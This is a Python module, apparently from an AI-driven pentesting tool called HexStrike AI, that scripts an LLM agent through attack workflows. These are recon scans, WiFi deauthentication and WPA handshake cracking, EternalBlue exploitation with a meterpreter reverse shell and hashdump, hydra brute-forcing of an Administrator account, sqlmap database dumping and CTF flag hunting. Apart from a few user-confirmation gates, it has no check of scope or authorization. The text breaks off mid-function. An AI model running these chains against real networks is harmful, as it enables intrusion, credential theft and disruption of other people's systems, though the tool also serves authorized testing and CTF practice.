"""
mcp_core/prompts.py

FastMCP 3.x native workflow prompts for HexStrike AI.

Each @mcp.prompt() returns list[Message] — structured user/assistant messages
that guide the LLM through a multi-step workflow. User messages set context
and ask for action; assistant messages show the exact run_security_tool() calls.

Functions are defined at module level so they can be imported and tested directly.
register_prompts() wraps them with @mcp.prompt() for MCP registration.

CTF prompts powered by CTFWorkflowManager (V6 intelligence layer):
  ctf_web_challenge  — web-specific, URL-based entry point
  ctf_challenge      — universal, all 7 categories (web/crypto/pwn/forensics/rev/misc/osint)

Skills reference:
  nmap-recon, subdomain-enum, web-recon, web-vuln,
  password-cracking, smb-enum, exploitation, cloud-audit
"""

from fastmcp import FastMCP
from fastmcp.prompts import PromptResult
from fastmcp.prompts.prompt import Message


# ── Simple prompts ──────────────────────────────────────────────────────


async def bug_bounty_recon(target: str) -> PromptResult:
    """
    Full bug bounty reconnaissance workflow.
    Skills: subdomain-enum + nmap-recon + web-recon + web-vuln

    Ordering rationale:
      1. WAF detection FIRST — prevents gobuster/nuclei from being blocked
      2. Subdomain enum — passive, no noise
      3. Port scan — after knowing live hosts
      4. Directory discovery — after WAF is known
      5. Vuln scan — last, noisiest

    Args:
        target: Root domain to recon (e.g. 'example.com')
    """
    if not target:
        return PromptResult(
            messages=[Message("Error: bug_bounty_recon requires a non-empty `target` parameter. Example: `target=\"example.com\"` or `target=\"http://192.168.1.165/DVWA/\"`.", role="user")],
            description="Bug bounty recon — missing target",
            meta={"version": "0.10.1", "error": "empty_target"},
        )
    target_url = target if target.startswith(("http://", "https://")) else f"https://{target}"
    msgs = [
        Message(
            f"You are running a full bug bounty reconnaissance workflow on target: {target}. "
            "Execute each step in order using run_security_tool(). "
            "Each step has expected_time, priority, fallback, and result_context. "
            "Use the result_context to decide whether to continue or adapt."
        ),
        Message(
            f"STEP 1 [priority: critical] [expected: 30-60s] — WAF detection and tech stack fingerprint\n"
            f"* Run first to avoid blocks. If wafw00f fails, httpx still detects tech.\n\n"
            f"run_security_tool(tool_name=\"wafw00f\", parameters='{{\"url\": \"{target_url}\"}}')\n"
            f"→ If wafw00f fails (no WAF detected): still safe to proceed — no WAF means fewer blocks\n"
            f"→ If wafw00f finds a WAF ({target} is behind Cloudflare/Cloudfront/etc.): note the provider and still proceed — some probes may be blocked\n\n"
            f"run_security_tool(tool_name=\"httpx\", parameters='{{\"target\": \"{target}\", \"probe\": true, \"tech_detect\": true, \"title\": true, \"status_code\": true}}')\n"
            f"→ httpx result_context: check tech stack (Apache/Nginx/Express), HTTP title, status code\n"
            f"→ If httpx fails: skip WAF phase entirely, proceed to Step 2\n"
            f"→ Fallback if both fail: target may be non-HTTP or heavily firewalled — proceed to Step 3 for port scan",
            role="assistant",
        ),
        Message(
            f"STEP 2 [priority: medium] [expected: 2-5 min] — Subdomain enumeration (passive, no noise)\n"
            f"* Run in background — results enrich later steps but don't block progress.\n\n"
            f"run_security_tool(tool_name=\"subfinder\", parameters='{{\"domain\": \"{target}\", \"silent\": true}}')\n"
            f"→ If subfinder fails: domain may have no public subdomains — try amass, or skip to Step 3\n\n"
            f"run_security_tool(tool_name=\"amass\", parameters='{{\"domain\": \"{target}\", \"mode\": \"enum\"}}')\n"
            f"→ If amass fails: target may be a single-domain setup — this is common for APIs\n"
            f"→ result_context: add discovered subdomains to the target list for later steps\n"
            f"→ Fallback if both fail: proceed with {target} only — subdomain discovery can be retried later",
            role="assistant",
        ),
        Message(
            f"STEP 3 [priority: critical] [expected: 2-5 min] — Port discovery and service detection\n"
            f"* Without port discovery, web/content scans are blind. This step is mandatory.\n\n"
            f"run_security_tool(tool_name=\"rustscan\", parameters='{{\"target\": \"{target}\", \"ports\": \"1-65535\"}}')\n"
            f"→ If rustscan fails: fall back to nmap with a focused port range (1-10000)\n\n"
            f"run_security_tool(tool_name=\"nmap\", parameters='{{\"target\": \"{target}\", \"additional_args\": \"-sV -sC -T4\"}}')\n"
            f"→ result_context: check open ports — if 80/443/8080 found → prioritize Step 4-5\n"
            f"→ If nmap fails: target may be firewalled or offline — try scan_background() with longer timeout\n"
            f"→ Fallback: if both port scanners fail, the target is heavily filtered — skip to Step 5 (nuclei can still probe HTTP on default ports)",
            role="assistant",
        ),
        Message(
            f"STEP 4 [priority: high] [expected: 3-10 min] — Web content discovery (post-WAF fingerprint)\n"
            f"* Only valuable if HTTP ports were found in Step 3. If no web ports, skip to Step 5.\n\n"
            f"run_security_tool(tool_name=\"katana\", parameters='{{\"url\": \"{target_url}\"}}')\n"
            f"→ If katana fails: target may block automated crawling — use gobuster instead\n\n"
            f"run_security_tool(tool_name=\"gobuster\", parameters='{{\"url\": \"{target_url}\", \"mode\": \"dir\", \"wordlist\": \"/usr/share/wordlists/dirb/common.txt\", \"additional_args\": \"-x php,html,txt\"}}')\n"
            f"→ result_context: note discovered paths — /api/, /admin/, /.git/ are high-value targets\n"
            f"→ If gobuster finds nothing with common.txt: try with raft-medium-words.txt (SecLists)\n"
            f"→ Fallback: if both web discovery tools fail, the target may be an API with no public paths — proceed to Step 5",
            role="assistant",
        ),
        Message(
            f"STEP 5 [priority: high] [expected: 5-15 min] — Vulnerability scan (last — noisiest step)\n"
            f"* Runs automated vulnerability templates. Can generate noise and WAF alerts.\n\n"
            f"run_security_tool(tool_name=\"nuclei\", parameters='{{\"target\": \"{target_url}\", \"severity\": \"critical,high\"}}')\n"
            f"→ result_context: check for critical/high findings — these are exploitation targets\n"
            f"→ If nuclei finds SQLi → next step is sqlmap\n"
            f"→ If nuclei finds XSS → next step is dalfox\n"
            f"→ If nuclei fails (0 matches): may have no known CVEs — still try nikto\n\n"
            f"run_security_tool(tool_name=\"nikto\", parameters='{{\"target\": \"{target_url}\"}}')\n"
            f"→ result_context: nikto finds info-level issues (paths, headers, config exposure)\n"
            f"→ If nikto times out (>300s): accept partial results — not all nikto checks are relevant\n"
            f"→ Fallback if both fail: target has no known vulnerabilities in public templates — switch to manual testing",
            role="assistant",
        ),
        Message(
            f"FINAL — Compile findings for {target}:\n"
            "- Subdomains: count discovered subdomains from Step 2\n"
            "- Open ports: list services and versions from Step 3\n"
            "- Tech stack: web server, framework, language from Step 1\n"
            "- Vulnerabilities: critical/high findings from Step 5 with suggested exploit tools\n"
            "- Attack surface: prioritise exposed admin panels, API endpoints, database ports\n\n"
            "If critical findings exist, suggest: sqlmap (for SQLi), dalfox (for XSS), metasploit (for RCE).\n"
            "If no critical findings, suggest: continued directory discovery with SecLists wordlists."
        ),
    ]
    return PromptResult(
        messages=msgs,
        description=f"Bug bounty recon workflow for {target}",
        meta={
            "version": "0.10.1",
            "phase": "Phase 3",
            "tools_count": 10,
            "estimated_time_min": 15,
        },
    )


async def wifi_attack_chain(interface: str, bssid: str, channel: str = "6") -> PromptResult:
    """
    Full WiFi WPA/WPA2 handshake capture and crack chain.
    Skills: wifi_pentest

    Args:
        interface: Wireless interface (e.g. 'wlan0')
        bssid:     Target AP MAC address (e.g. 'AA:BB:CC:DD:EE:FF')
        channel:   Target AP channel (default '6')
    """
    msgs = [
        Message(
            f"You are running a WiFi WPA/WPA2 attack chain — "
            f"interface: {interface} | BSSID: {bssid} | channel: {channel}. "
            "Execute each step in order. Each step has expected_time, priority, "
            "and result_context to guide decisions."
        ),
        Message(
            f"STEP 1 [priority: critical] [expected: 10s] — Enable monitor mode\n"
            f"* Required for all subsequent WiFi operations.\n\n"
            f"run_security_tool(tool_name=\"airmon_ng\", parameters='{{\"interface\": \"{interface}\", \"action\": \"start\"}}')\n"
            f"→ If success: interface becomes {interface}mon — use this for all later steps\n"
            f"→ If airmon_ng fails: interface may not support monitor mode, or needs rfkill unblock\n"
            f"→ Fallback: try `rfkill unblock wifi` manually, or use a different interface",
            role="assistant",
        ),
        Message(
            f"STEP 2 [priority: critical] [expected: 30-120s] — Start targeted capture\n"
            f"* Listens for handshake on the target channel. Keep running until STEP 3 completes.\n\n"
            f"run_security_tool(tool_name=\"airodump_ng\", parameters='{{\"interface\": \"{interface}mon\", \"bssid\": \"{bssid}\", \"channel\": \"{channel}\", \"output_prefix\": \"/tmp/hexstrike_capture\"}}')\n"
            f"→ airodump_ng runs continuously — let it run in background while you proceed\n"
            f"→ result_context: check if a WPA handshake is captured (\"WPA handshake: {bssid}\" in output)\n"
            f"→ If handshake already captured: skip STEP 3 (deauth), proceed directly to STEP 4\n"
            f"→ Fallback: if no clients visible (\"0 stations\"), deauth won't work — try channel hopping first",
            role="assistant",
        ),
        Message(
            "⚠️ STEP 3 requires user confirmation — deauth attack will disconnect all clients. "
            "Confirm before proceeding. Only run if handshake not already captured (check STEP 2 output)."
        ),
        Message(
            f"STEP 3 [priority: high] [expected: 10-30s] — Force client deauthentication\n"
            f"* Only run this if STEP 2 did NOT capture a handshake. Deauth forces reconnection → captures the 4-way handshake.\n\n"
            f"run_security_tool(tool_name=\"aireplay_ng\", parameters='{{\"interface\": \"{interface}mon\", \"attack_mode\": 0, \"bssid\": \"{bssid}\", \"count\": 10}}')\n"
            f"→ result_context: check that deauth packets are being sent (\"Sent XX packets\" in output)\n"
            f"→ If aireplay_ng fails: no associated clients, or interface not in monitor mode\n"
            f"→ Fallback if no clients respond: target may be idle — retry STEP 2 during business hours",
            role="assistant",
        ),
        Message(
            f"STEP 4 [priority: critical] [expected: 1-30 min] — Crack captured handshake\n"
            f"* Only run if a handshake .cap file exists at /tmp/hexstrike_capture-01.cap.\n\n"
            f"run_security_tool(tool_name=\"aircrack_ng\", parameters='{{\"capture_files\": [\"/tmp/hexstrike_capture-01.cap\"], \"wordlist\": \"/usr/share/wordlists/rockyou.txt\", \"bssid\": \"{bssid}\"}}')\n"
            f"→ result_context: check \"KEY FOUND\" vs \"KEY NOT FOUND\" in output\n"
            f"→ If KEY FOUND: PSK displayed in output — report immediately\n"
            f"→ If KEY NOT FOUND: wordlist (rockyou.txt) didn't contain the password\n"
            f"→ Fallback: suggest hashcat with GPU rules + custom wordlist for faster cracking\n"
            f"→ Alternative fallback: try with a targeted wordlist (e.g., company name + years)",
            role="assistant",
        ),
        Message(
            f"STEP 5 [priority: medium] [expected: 10s] — Restore managed mode\n"
            f"* Cleanup step — always run to restore network connectivity.\n\n"
            f"run_security_tool(tool_name=\"airmon_ng\", parameters='{{\"interface\": \"{interface}mon\", \"action\": \"stop\"}}')\n"
            f"→ If success: interface returns to managed mode, network connectivity restored\n"
            f"→ If airmon_ng stop fails: may leave interface in inconsistent state — reboot may be needed",
            role="assistant",
        ),
        Message(
            f"FINAL — Report for BSSID {bssid}:\n"
            "- Handshake captured: yes/no\n"
            "- PSK cracked: (key if found, 'not cracked' otherwise)\n"
            "- If KEY NOT FOUND: suggest hashcat GPU cracking with rules, custom wordlist, or rule-based attack\n"
            "- If no handshake at all: target may have no active clients — retry during peak hours"
        ),
    ]
    return PromptResult(
        messages=msgs,
        description=f"WiFi WPA/WPA2 attack chain for {bssid}",
        meta={
            "version": "0.10.1",
            "phase": "Phase 3",
            "tools_count": 4,
            "estimated_time_min": 5,
        },
    )


async def smb_lateral_movement(target: str) -> PromptResult:
    """
    SMB enumeration and lateral movement workflow.
    Skills: smb-enum + exploitation

    Args:
        target: Target IP or CIDR range (e.g. '10.10.10.10' or '192.168.1.0/24')
    """
    if not target:
        return PromptResult(
            messages=[Message("Error: smb_lateral_movement requires a non-empty `target` parameter. Example: `target=\"10.10.10.10\"`.", role="user")],
            description="SMB lateral movement — missing target",
            meta={"version": "0.10.1", "error": "empty_target"},
        )
    msgs = [
        Message(
            f"You are running an SMB enumeration and lateral movement workflow on target: {target}. "
            "Execute each step in order. Each step has expected_time, priority, "
            "and result_context to guide decisions."
        ),
        Message(
            f"STEP 1 [priority: critical] [expected: 1-3 min] — NetBIOS discovery and SMB version check\n"
            f"* Determines if target has SMB services exposed.\n\n"
            f"run_security_tool(tool_name=\"nbtscan\", parameters='{{\"target\": \"{target}\"}}')\n"
            f"→ result_context: check for NetBIOS name table — reveals hostname, domain, logged-in users\n"
            f"→ If nbtscan fails: target may not run NetBIOS — still proceed with nmap\n\n"
            f"run_security_tool(tool_name=\"nmap\", parameters='{{\"target\": \"{target}\", \"ports\": \"445,139\", \"additional_args\": \"-sV -sC --script smb-vuln-*,smb-security-mode,smb2-security-mode\"}}')\n"
            f"→ result_context: check SMB version (SMB1 vs SMB2/3), security mode, and vulnerability scripts\n"
            f"→ If nmap script finds MS17-010: EternalBlue exploitable → prioritize STEP 3-4\n"
            f"→ If nmap shows SMB signing disabled: relay attacks possible → note for later\n"
            f"→ If ports 445/139 are filtered/closed: target has no SMB — workflow stops here",
            role="assistant",
        ),
        Message(
            f"STEP 2 [priority: high] [expected: 2-5 min] — Null session enumeration\n"
            f"* Tries unauthenticated access to SMB shares and user enumeration.\n\n"
            f"run_security_tool(tool_name=\"enum4linux\", parameters='{{\"target\": \"{target}\", \"additional_args\": \"-a\"}}')\n"
            f"→ result_context: check for share listings, user lists, password policy\n"
            f"→ If enum4linux finds shares without auth: misconfigured SMB — high-value target\n"
            f"→ If enum4linux fails or returns empty: null sessions may be disabled (modern Windows default)\n\n"
            f"run_security_tool(tool_name=\"smbmap\", parameters='{{\"target\": \"{target}\"}}')\n"
            f"→ result_context: check accessible shares and their permissions (READ/WRITE)\n"
            f"→ If smbmap finds writable shares: potential for file upload attacks (e.g., SCF, shortcut hijack)\n"
            f"→ If both enum4linux and smbmap return nothing: SMB is locked down — skip to STEP 3 for vulnerability check",
            role="assistant",
        ),
        Message(
            f"STEP 3 [priority: critical] [expected: 30-60s] — EternalBlue check + credential testing\n"
            f"* Decision point: if MS17-010 confirmed, proceed to exploitation. If not, pivot to credential attacks.\n\n"
            f"run_security_tool(tool_name=\"nmap\", parameters='{{\"target\": \"{target}\", \"ports\": \"445\", \"additional_args\": \"--script smb-vuln-ms17-010\"}}')\n"
            f"→ result_context: check \"VULNERABLE\" vs \"NOT VULNERABLE\" in script output\n"
            f"→ IF VULNERABLE: proceed to STEP 4 (EternalBlue exploitation) — this is the priority path\n"
            f"→ IF NOT VULNERABLE: SMB is patched against EternalBlue — proceed to STEP 4 alternative (credential brute-force)\n\n"
            f"run_security_tool(tool_name=\"netexec\", parameters='{{\"target\": \"{target}\", \"protocol\": \"smb\"}}')\n"
            f"→ result_context: check SMB signing status, SMB version, available shares\n"
            f"→ If netexec reveals SMB signing disabled: relay attack is viable\n"
            f"→ Fallback: if both nmap and netexec fail, target may be filtering SMB probes — try with different source port",
            role="assistant",
        ),
        Message(
            "⚠️ STEP 4 requires user confirmation — exploitation will run. "
            "Confirm only if STEP 3 confirmed MS17-010 (EternalBlue) or you have valid credentials."
        ),
        Message(
            f"STEP 4 [priority: high] [expected: 2-10 min] — Exploitation or credential attack\n"
            f"* Path A: EternalBlue exploitation (if MS17-010 confirmed in STEP 3).\n"
            f"* Path B: Credential brute-force (if SMB is patched but has open shares).\n"
            f"* Choose PATH A or PATH B based on STEP 3 result_context.\n\n"
            f"PATH A — EternalBlue exploitation:\n"
            f"run_security_tool(tool_name=\"metasploit\", parameters='{{\"module\": \"exploit/windows/smb/ms17_010_eternalblue\", \"options\": {{\"RHOSTS\": \"{target}\", \"PAYLOAD\": \"windows/x64/meterpreter/reverse_tcp\"}}}}')\n"
            f"→ If metasploit succeeds: meterpreter session opened → post-exploitation (hashdump, screenshots)\n"
            f"→ If metasploit fails: target may be patched despite nmap flag, or architecture mismatch (x86 vs x64)\n\n"
            f"PATH B — Credential brute-force (if EternalBlue not viable):\n"
            f"run_security_tool(tool_name=\"hydra\", parameters='{{\"target\": \"{target}\", \"protocol\": \"smb\", \"username\": \"Administrator\", \"wordlist\": \"/usr/share/wordlists/rockyou.txt\"}}')\n"
            f"→ result_context: check for valid credentials in hydra output\n"
            f"→ If hydra finds creds: use netexec or smbmap to access shares and enumerate\n"
            f"→ If hydra finds nothing: try with common usernames (admin, guest, vagrant) or domain users from STEP 2\n\n"
            f"Fallback if both paths fail: SMB is well-hardened — move to different attack vector",
            role="assistant",
        ),
        Message(
            f"FINAL — Report SMB findings for {target}:\n"
            "- SMB accessible: yes/no (ports 445/139)\n"
            "- Shares accessible: list of shares and permissions\n"
            "- MS17-010 (EternalBlue): vulnerable/patched/unknown\n"
            "- Credentials discovered: list of valid username:password pairs if found\n"
            "- Attack surface: relay possibilities (signing disabled), writable shares, user enumeration\n\n"
            "If EternalBlue was exploited: include meterpreter session status and acquired hashes.\n"
            "If SMB was locked down: report as hardened and suggest alternative recon vectors (RDP, WinRM, etc.)."
        ),
    ]
    return PromptResult(
        messages=msgs,
        description=f"SMB enumeration and lateral movement for {target}",
        meta={
            "version": "0.10.1",
            "phase": "Phase 3",
            "tools_count": 6,
            "estimated_time_min": 15,
        },
    )


async def cloud_security_audit(
    provider: str = "aws",
    profile: str = "default",
    target_image: str = "",
    k8s_api_ip: str = "",
) -> PromptResult:
    """
    Cloud security audit workflow.
    Skills: cloud-audit

    Args:
        provider:     Cloud provider ('aws', 'azure', 'gcp')
        profile:      Cloud credential profile (default 'default')
        target_image: Container image to scan (e.g. 'myapp:latest', default 'nginx:latest')
        k8s_api_ip:   Kubernetes API IP for cluster assessment (optional)
    """
    image = target_image or "nginx:latest"
    msgs = [
        Message(
            f"You are running a cloud security audit — provider: {provider} | profile: {profile} | image: {image}. "
            "Execute each step in order. Each step has expected_time, priority, "
            "and result_context to guide decisions."
        ),
        Message(
            f"STEP 1 [priority: critical] [expected: 30-60 min] — Cloud configuration and compliance audit\n"
            f"* Longest step — prowler runs 200+ checks across IAM, S3, EC2, RDS, Lambda, CloudTrail.\n\n"
            f"run_security_tool(tool_name=\"prowler\", parameters='{{\"provider\": \"{provider}\", \"profile\": \"{profile}\"}}')\n"
            f"→ result_context: prowler output is grouped by service (iam, s3, ec2, etc.) and severity (CRITICAL, HIGH, MEDIUM, LOW)\n"
            f"→ Check for CRITICAL findings first: public S3 buckets, IAM keys exposed, MFA disabled\n"
            f"→ If prowler fails with credential error: AWS credentials not configured for profile '{profile}'\n"
            f"→ Fallback: run `aws configure` to set credentials, or provide a different profile\n"
            f"→ Alternative: if no credentials available, skip cloud audit and focus on container + K8s scanning only",
            role="assistant",
        ),
        Message(
            f"STEP 2 [priority: high] [expected: 2-10 min] — Container image vulnerability scan (target: {image})\n"
            f"* Scans the container image for known CVEs using advisory databases.\n\n"
            f"run_security_tool(tool_name=\"trivy\", parameters='{{\"target\": \"{image}\", \"scan_type\": \"image\", \"severity\": \"HIGH,CRITICAL\"}}')\n"
            f"→ result_context: check for CRITICAL CVEs with known exploits — these are actionable\n"
            f"→ If trivy finds CRITICAL CVEs: note CVE IDs, affected packages, and fix versions\n"
            f"→ If trivy fails: image may not exist locally — try pulling with `docker pull {image}` first\n"
            f"→ Fallback: if image not found, try scanning the filesystem or repo trivy with scan_type=\"fs\"\n"
            f"→ If no CRITICAL/HIGH CVEs found: report as clean — still document MEDIUM/LOW for remediation planning",
            role="assistant",
        ),
        Message(
            f"STEP 3 [priority: medium] [expected: 5-20 min] — Kubernetes cluster assessment"
            + (f" (API: {k8s_api_ip}):\n\n"
               f"* Scans the K8s cluster for misconfigurations, known vulnerabilities, and RBAC issues.\n\n"
               f"run_security_tool(tool_name=\"kube_hunter\", parameters='{{\"additional_args\": \"--remote {k8s_api_ip}\"}}')\n"
               f"→ result_context: check for CRITICAL findings (e.g., anonymous auth enabled, exposed dashboard)\n"
               f"→ If kube_hunter finds open etcd port (2379): full cluster compromise possible — report immediately\n"
               f"→ If kube_hunter hangs or times out: API endpoint may be firewalled or authenticated\n"
               f"→ Fallback: try kubescape for more detailed K8s hardening checks\n"
               f"→ Alternative: if cluster not accessible, scan K8s manifests statically with trivy"
               if k8s_api_ip else
               ":\n\n* No Kubernetes cluster target provided.\n"
               "→ Skip this step — provide k8s_api_ip parameter to enable K8s cluster assessment.\n"
               "→ Alternative: if you have K8s manifest files, scan them with trivy (scan_type=\"config\")\n"
               "→ If no K8s in scope, focus on container security (STEP 2) and IAM audit (STEP 1)"),
            role="assistant",
        ),
        Message(
            f"FINAL — Cloud audit report for {provider}:\n"
            "- IAM misconfigurations: (number of CRITICAL findings from STEP 1)\n"
            f"- Container CVEs ({image}): list of CRITICAL and HIGH severities with CVEs\n"
            "- Kubernetes attack surface: (findings from STEP 3, or 'not assessed')\n"
            "- Top 3 actionable items: prioritise by severity + exploitability\n\n"
            "If provider credentials failed: document which checks could not run and suggest manual review."
        ),
    ]
    return PromptResult(
        messages=msgs,
        description=f"Cloud security audit for {provider}",
        meta={
            "version": "0.10.1",
            "phase": "Phase 3",
            "tools_count": 3,
            "estimated_time_min": 60,
        },
    )


# ── CTF prompts ─────────────────────────────────────────────────────────


async def ctf_web_challenge(url: str) -> list[Message]:
    """
    CTF web challenge — enumeration and exploitation workflow.
    Powered by CTFWorkflowManager (V6 intelligence layer).
    Skills: web-recon + web-vuln

    Args:
        url: Challenge URL (e.g. 'http://challenge.ctf.local:8080')
    """
    from server_core.singletons import get_ctf_manager
    from server_core.workflows.ctf.CTFChallenge import CTFChallenge

    challenge = CTFChallenge(
        name="ctf_web",
        category="web",
        description=f"CTF web challenge at {url}",
        difficulty="unknown",
        url=url,
        target=url,
    )

    ctf = get_ctf_manager()
    workflow = ctf.create_ctf_challenge_workflow(challenge)

    steps = workflow.get("workflow_steps", [])
    strategies = workflow.get("strategies", [])
    fallback = workflow.get("fallback_strategies", [])
    suggested_tools = workflow.get("tools", [])
    est_time_min = workflow.get("estimated_time", 3600) // 60
    success_prob = workflow.get("success_probability", 0.65)
    validation = workflow.get("validation_steps", [])

    strategy_summary = ""
    if strategies:
        strategy_summary = "\nStrategies: " + ", ".join(s["strategy"] for s in strategies[:4])

    fallback_summary = ""
    if fallback:
        fallback_summary = "\nFallback: " + ", ".join(f["strategy"] for f in fallback[:3])

    def step_label(n):
        if len(steps) > n:
            return f"{steps[n]['action']} — {steps[n]['description']}"
        return ""

    return [
        Message(
            f"CTF Web Challenge at: {url}\n"
            f"Estimated: ~{est_time_min} min | Success probability: {success_prob:.0%}\n"
            f"CTFWorkflowManager tools: {', '.join(suggested_tools[:8])}"
            f"{strategy_summary}"
            f"{fallback_summary}\n"
            "Execute each step using run_security_tool()."
        ),
        Message(
            f"STEP 1 — {step_label(0) or 'Reconnaissance: tech detection and WAF check'}\n"
            f'run_security_tool(tool_name="wafw00f", parameters=\'{{"url": "{url}"}}\')\n'
            f'run_security_tool(tool_name="httpx", parameters=\'{{"target": "{url}", "probe": true, "tech_detect": true, "title": true}}\')\n'
            f'run_security_tool(tool_name="nikto", parameters=\'{{"target": "{url}"}}\')',
            role="assistant",
        ),
        Message(
            f"STEP 2 — {step_label(2) or 'Directory enumeration: multi-tool discovery'}\n"
            f'run_security_tool(tool_name="gobuster", parameters=\'{{"url": "{url}", "mode": "dir", "wordlist": "/usr/share/wordlists/dirb/common.txt", "additional_args": "-x php,html,txt,bak,old,zip"}}\')\n'
            f'run_security_tool(tool_name="ffuf", parameters=\'{{"url": "{url}/FUZZ", "wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt", "match_codes": "200,204,301,302,307,401,403"}}\')\n'
            f'run_security_tool(tool_name="katana", parameters=\'{{"url": "{url}"}}\')',
            role="assistant",
        ),
        Message(
            f"STEP 3 — {step_label(4) or 'Vulnerability scanning: automated scan + injection testing'}\n"
            f'run_security_tool(tool_name="nuclei", parameters=\'{{"target": "{url}"}}\')\n'
            f'run_security_tool(tool_name="sqlmap", parameters=\'{{"url": "{url}", "additional_args": "--batch --level=3 --risk=2 --dbs"}}\')\n'
            f'run_security_tool(tool_name="dalfox", parameters=\'{{"url": "{url}"}}\')',
            role="assistant",
        ),
        Message(
            f"STEP 4 — {step_label(5) or 'Manual exploitation'}\n"
            "If automation found nothing: apply fallback strategies above.\n"
            "Parameter tampering, cookie/session manipulation, business logic flaws."
        ),
        Message(
            f"FINAL — Collect CTF findings for {url}:\n"
            "- Flags: check /flag, /flag.txt, /etc/passwd, response bodies, cookies, source comments\n"
            "- Validation: " + ", ".join(v["step"] for v in validation[:4])
        ),
    ]


async def ctf_challenge(
    name: str,
    category: str,
    description: str,
    difficulty: str = "unknown",
    target: str = "",
    points: str | int = "0",
) -> list[Message]:
    """
    Universal CTF challenge workflow — all categories.
    Powered by CTFWorkflowManager + CTFToolManager (V6 intelligence layer).

    The workflow is generated dynamically from the challenge description and category.
    Tool selection, strategy, time estimation, and resource requirements are all
    computed by CTFWorkflowManager based on the V6 intelligence layer.

    Categories: web, crypto, pwn, forensics, rev, misc, osint

    Args:
        name:        Challenge name
        category:    Challenge category (web/crypto/pwn/forensics/rev/misc/osint)
        description: Challenge description — drives intelligent tool selection
        difficulty:  easy/medium/hard/insane/unknown (default 'unknown')
        target:      Target URL, IP, or binary path (optional)
        points:      Challenge point value (optional)
    """
    from server_core.singletons import get_ctf_manager
    from server_core.workflows.ctf.CTFChallenge import CTFChallenge
    from server_core.workflows.ctf.toolManager import CTFToolManager

    try:
        points_int = int(points)
    except (ValueError, TypeError):
        import re as _re
        match = _re.search(r'\d+', str(points))
        points_int = int(match.group()) if match else 0

    challenge = CTFChallenge(
        name=name,
        category=category,
        description=description,
        difficulty=difficulty,
        target=target,
        points=points_int,
    )

    ctf = get_ctf_manager()
    tool_mgr = CTFToolManager()
    workflow = ctf.create_ctf_challenge_workflow(challenge)

    steps = workflow.get("workflow_steps", [])
    strategies = workflow.get("strategies", [])
    fallback = workflow.get("fallback_strategies", [])
    parallel_tasks = workflow.get("parallel_tasks", [])
    suggested_tools = workflow.get("tools", [])
    est_time_min = workflow.get("estimated_time", 3600) // 60
    success_prob = workflow.get("success_probability", 0.55)
    validation = workflow.get("validation_steps", [])
    expected_artifacts = workflow.get("expected_artifacts", [])
    resources = workflow.get("resource_requirements", {})

    tool_commands = []
    for tool in suggested_tools[:4]:
        try:
            cmd = tool_mgr.get_tool_command(tool, target or name)
            tool_commands.append(f"  {tool}: {cmd[:100]}")
        except Exception:
            tool_commands.append(f"  {tool}: (see tool docs)")

    parallel_info = ""
    if parallel_tasks:
        groups = [
            f"[{g['task_group']}] {', '.join(g['tasks'][:3])} (max {g['max_concurrent']} concurrent)"
            for g in parallel_tasks[:3]
        ]
        parallel_info = "\n\nParallel execution:\n" + "\n".join(groups)

    resource_info = ""
    if resources:
        resource_info = (
            f"\nRequired: {resources.get('cpu_cores', 2)} CPU cores, "
            f"{resources.get('memory_mb', 2048)}MB RAM"
            + (", GPU" if resources.get("gpu_required") else "")
        )

    messages = [
        Message(
            f"CTF Challenge: [{category.upper()}] {name} | {difficulty} | {points} pts\n"
            f"Description: {description[:200]}{'...' if len(description) > 200 else ''}\n"
            f"Target: {target or 'see challenge files'}\n"
            f"Estimated: ~{est_time_min} min | Success probability: {success_prob:.0%}"
            f"{resource_info}\n\n"
            f"CTFWorkflowManager selected {len(suggested_tools)} tools: {', '.join(suggested_tools[:8])}\n"
            + ("\nOptimized commands:\n" + "\n".join(tool_commands) if tool_commands else "")
            + parallel_info
        ),
    ]

    for step in steps[:6]:
        step_tools = step.get("tools", [])
        is_parallel = step.get("parallel", False)
        est_step_min = step.get("estimated_time", 600) // 60

        step_calls = []
        for tool in step_tools[:3]:
            if tool not in ("manual", "custom", "python", "sage"):
                step_calls.append(
                    f'run_security_tool(tool_name="{tool}", '
                    f'parameters=\'{{"target": "{target or name}"}}\')'
                )
            else:
                step_calls.append(f"# {step['description']}")

        parallel_note = " [PARALLEL — run concurrently]" if is_parallel else ""
        step_content = (
            f"STEP {step['step']} — {step['action'].upper()}{parallel_note} (~{est_step_min} min):\n"
            f"{step['description']}\n"
            + ("\n".join(step_calls) if step_calls else f"# {step['description']}")
        )
        messages.append(Message(step_content, role="assistant"))

    if strategies:
        strategy_content = (
            f"KEY STRATEGIES for {category} challenges:\n"
            + "\n".join(
                f"  • {s['strategy']}: {s['description']}"
                for s in strategies[:5]
            )
        )
        if fallback:
            strategy_content += (
                "\n\nFALLBACK if primary fails:\n"
                + "\n".join(
                    f"  • {f['strategy']}: {f['description']}"
                    for f in fallback[:3]
                )
            )
        messages.append(Message(strategy_content))

    artifact_list = (
        ", ".join(a["type"] for a in expected_artifacts[:4])
        if expected_artifacts else "flag, solution artifacts"
    )
    validation_list = (
        ", ".join(v["step"] for v in validation[:4])
        if validation else "flag_format_check, solution_verification"
    )

    messages.append(Message(
        f"FINAL — Collect results for [{category.upper()}] {name}:\n"
        f"Expected artifacts: {artifact_list}\n"
        f"Validation: {validation_list}\n"
        "Flag format: flag{...} or CTF{...} — validate before submitting."
    ))

    return messages


async def authenticated_web_workflow(target: str = "") -> PromptResult:
    """
    Authenticated web application testing workflow.
    Use when a target has a login form requiring authentication
    before accessing protected functionality.
    
    Teaches the LLM to: discover http_request → GET login form → extract CSRF token
    → POST credentials → capture session cookie → authenticated scanning.
    """
    url = target.rstrip("/") if target else "<target>"
    text = f"""## Authenticated Web Testing Workflow

Target: {url}

This target requires authentication before protected pages are accessible.
Follow these steps using the MCP tools provided:

### Step 1 — Discover the HTTP client
Call `search_tools("http post form cookie")` to find the `http_request` tool.
*http_request is a generic HTTP client that returns structured responses with status_code, headers, cookies, and body.*

### Step 2 — GET the login form
Call `call_tool("http_request", method="GET", url="{url}/login.php")`
→ Look for hidden CSRF token in the body: `<input.*?name=['"]user_token['"].*?value=['"](.*?)['"]`
→ Capture Set-Cookie from the cookies field of the response

### Step 3 — POST credentials
Call `call_tool("http_request", method="POST", url="{url}/login.php", data="username=...&password=...&user_token=...&Login=Login", cookie="PHPSESSID=...")`
→ `ok: true` with a `302` redirect = login successful
→ Capture the new session cookie for authenticated requests

### Step 4 — Authenticated scanning
Use `scan()` or individual tools with the captured cookie:
